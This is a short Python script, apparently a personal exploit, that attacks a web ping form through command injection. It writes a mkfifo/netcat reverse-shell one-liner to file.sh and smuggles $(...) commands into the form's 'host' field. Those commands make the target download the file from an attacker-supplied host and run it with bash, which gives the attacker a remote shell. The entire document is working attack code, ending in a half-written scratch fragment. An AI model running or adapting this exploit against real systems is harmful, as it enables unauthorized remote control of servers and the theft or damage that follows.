#!/usr/bin/python3
import requests
#import os
import urllib.parse

ip_objetivo=input()
host=input()
port=input()
file=open("file.sh","w")
reverse="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port} >/tmp/f".format(host=host, port=port)
file.write(reverse)
file.close()


url="http://{ip_objetivo}/".format(ip_objetivo=ip_objetivo)
ping="-c 1 $({command_aux})"


#command_aux=input()
commands=["wget {host}/file.sh","bash file.sh"]
for command in commands:
    if ("host" in command):
        command=command.format(host=host)
    command=ping.format(command_aux=command).replace(" ","+")
    #command_encoded=urllib.parse.quote(command,safe='')
    #print(command_encoded)
    data={"host":command}
    print(url)
    print(data)
    requests.post(url, data=data)

"""
#print(url)
#cookies={}
data={"host":}

"""
